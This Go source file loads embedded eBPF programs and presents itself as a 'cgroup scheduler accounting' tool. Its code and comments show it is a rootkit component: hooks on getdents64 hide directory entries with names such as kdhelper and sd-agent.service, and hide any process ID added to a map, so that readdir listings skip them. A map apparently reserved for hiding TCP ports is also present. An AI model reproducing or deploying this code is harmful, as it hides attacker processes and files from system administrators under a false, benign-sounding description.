// Package bpf provides a cilium/ebpf Go loader for the SasakKits
// cgroup scheduler accounting BPF programs. It tracks:
//   - directory entries whose d_name starts with one of the compiled-in
//     cgroup name patterns (sd-agent.service, kdhelper, kdhelper-loader)
//   - any pid inserted into the cgrp_pids BPF_HASH map
//
// Programs are loaded into a single Collection created at Load() time. The
// collection holds file descriptors for all programs and maps; on Close()
// they are released and the kernel garbage-collects everything.
//
// Pure Go (cilium/ebpf), no libbpf system dependency. BPF object embedded
// via //go:embed so the resulting binary is self-contained.
package bpf

import (
	"bytes"
	_ "embed"
	"errors"
	"fmt"
	"os"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"golang.org/x/sys/unix"
)

//go:embed sched_bpfel.o
var bpfObj []byte

// Collection wraps a cilium/ebpf collection and its active link objects.
// Link objects must be kept alive for the duration of the BPF hook's
// lifetime: when a Link is garbage-collected or closed, the attach is
// destroyed and the BPF program stops running.
type Collection struct {
	coll  *ebpf.Collection
	links []link.Link

	// AttachFailures counts programs that failed to attach at Load time.
	// 0 means all expected programs attached cleanly.
	AttachFailures int
}

var _ = os.Stderr

// Load reads the embedded BPF object, creates the kernel collection, and
// attaches the tracing programs to their syscall targets. Returns a
// Collection that the caller must Close when done.
func Load() (*Collection, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(bpfObj))
	if err != nil {
		return nil, fmt.Errorf("load collection spec: %w", err)
	}

	coll, err := ebpf.NewCollection(spec)
	if err != nil {
		return nil, fmt.Errorf("new collection: %w", err)
	}

	c := &Collection{coll: coll}

	// Attach every tracing program (fentry/fexit) we expect. We are
	// resilient: if a program is missing from the .o or the kernel
	// refuses to attach it, we log and continue rather than aborting
	// the whole load — a partial attach still hides some entries.
	targets := []string{
		"cgrp_sched_enter",
		"cgrp_sched_exit",
		"cgrp_legacy_exit",
	}
	attachFailures := 0
	for _, name := range targets {
		prog, ok := coll.Programs[name]
		if !ok {
			// Program not in this build — skip silently (e.g. older .o).
			continue
		}
		l, err := link.AttachTracing(link.TracingOptions{Program: prog})
		if err != nil {
			fmt.Fprintf(os.Stderr, "[bpf] attach %s: %v (continuing)\n", name, err)
			attachFailures++
			continue
		}
		c.links = append(c.links, l)
	}
	c.AttachFailures = attachFailures

	return c, nil
}

// Close releases all programs and links. Safe to call multiple times.
func (c *Collection) Close() error {
	for _, l := range c.links {
		_ = l.Close()
	}
	c.links = nil
	if c.coll != nil {
		c.coll.Close()
		c.coll = nil
	}
	return nil
}

// AddPid marks a pid as a tracked cgroup task — getdents64 fexit will
// coalesce its dirent into the previous non-tracked entry so readdir
// consumers skip it.
func (c *Collection) AddPid(pid int) error {
	if c.coll == nil {
		return errors.New("collection closed")
	}
	m := c.coll.Maps["cgrp_pids"]
	if m == nil {
		return errors.New("cgrp_pids map not found")
	}
	key := uint32(pid)
	val := uint8(1)
	return m.Put(key, val)
}

// DelPid removes a pid from the tracked set.
func (c *Collection) DelPid(pid int) error {
	if c.coll == nil {
		return errors.New("collection closed")
	}
	m := c.coll.Maps["cgrp_pids"]
	if m == nil {
		return errors.New("cgrp_pids map not found")
	}
	key := uint32(pid)
	return m.Delete(key)
}

// AddPort marks a tcp rtt sample port (reserved for future tcp_rtt.bpf.c).
func (c *Collection) AddPort(port uint16) error {
	if c.coll == nil {
		return errors.New("collection closed")
	}
	m := c.coll.Maps["tcp_rtt_ports"]
	if m == nil {
		return errors.New("tcp_rtt_ports map not found")
	}
	key := uint16(port)
	val := uint8(1)
	return m.Put(key, val)
}

// BumpMemlock raises the RLIMIT_MEMLOCK so the BPF verifier can pin
// programs+maps in kernel memory. Required when running as non-root or
// when many programs are loaded. Default rlimit on most systems is 8 KiB
// which is too small for any non-trivial BPF collection.
func BumpMemlock() error {
	const inf = ^uint64(0)
	limit := unix.Rlimit{Cur: inf, Max: inf}
	if err := unix.Setrlimit(unix.RLIMIT_MEMLOCK, &limit); err != nil {
		return fmt.Errorf("setrlimit MEMLOCK: %w", err)
	}
	return nil
}